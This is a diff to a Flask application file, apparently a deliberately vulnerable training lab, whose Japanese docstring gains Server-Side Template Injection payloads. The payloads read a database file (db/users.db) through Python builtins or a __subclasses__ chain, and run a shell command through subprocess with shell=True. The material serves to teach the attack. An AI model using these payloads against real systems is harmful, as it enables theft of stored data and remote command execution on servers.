@@ -2,7 +2,13 @@
 Server-Side Template Injection (SSTI)
 
 データベースファイルを表示させるペイロード：
+{{ request.application.__globals__.__builtins__.__import__('io').open('db/users.db', 'rb').read() }}
+
+あるいは：
 {{ ''.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('db/users.db', 'rb').read() }}
+
+サーバーのディレクトリーのファイル一覧を表示するコマンド：
+{{ request.application.__globals__.__builtins__.__import__('subprocess').check_output('dir', stderr=request.application.__globals__.__builtins__.__import__('subprocess').STDOUT, shell=True).decode() }}
 """
 
 from flask import Flask, render_template_string, request
